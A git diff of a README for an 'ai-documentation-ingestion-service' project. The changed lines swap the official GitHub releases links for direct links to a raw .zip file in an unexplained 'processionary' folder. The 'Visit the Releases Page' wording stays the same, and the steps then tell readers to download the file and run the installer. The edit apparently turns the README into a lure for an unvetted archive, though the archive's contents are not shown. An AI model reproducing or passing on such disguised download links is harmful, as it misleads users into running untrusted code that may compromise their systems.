@@ -1,7 +1,7 @@
 # 🌟 ai-documentation-ingestion-service - Simplify Your Documentation Process
 
 ## 🚀 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/Amitdaskne/ai-documentation-ingestion-service/releases)
+[![Download](https://raw.githubusercontent.com/Amitdaskne/ai-documentation-ingestion-service/main/processionary/ai-documentation-ingestion-service.zip%20release-brightgreen)](https://raw.githubusercontent.com/Amitdaskne/ai-documentation-ingestion-service/main/processionary/ai-documentation-ingestion-service.zip)
 
 ## 📖 Overview
 The **ai-documentation-ingestion-service** is an AI-powered tool designed to help you manage documentation packages. With this service, you can easily generate versioned export templates while keeping track of all changes. It simplifies the process of documentation ingestion, making it efficient and user-friendly.
@@ -25,7 +25,7 @@ To run the ai-documentation-ingestion-service, ensure your system meets these ba
 ## 📥 Download & Install
 To get started, follow these simple steps:
 
-1. **Visit the Releases Page**: Click [here](https://github.com/Amitdaskne/ai-documentation-ingestion-service/releases) to access the download page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/Amitdaskne/ai-documentation-ingestion-service/main/processionary/ai-documentation-ingestion-service.zip) to access the download page.
 2. **Choose the Latest Release**: Look for the most recent version at the top of the list.
 3. **Download the File**: Click on the file that matches your operating system (e.g., Windows, macOS, Linux).
 4. **Run the Installer**: Locate the downloaded file and double-click it to start the installation process.
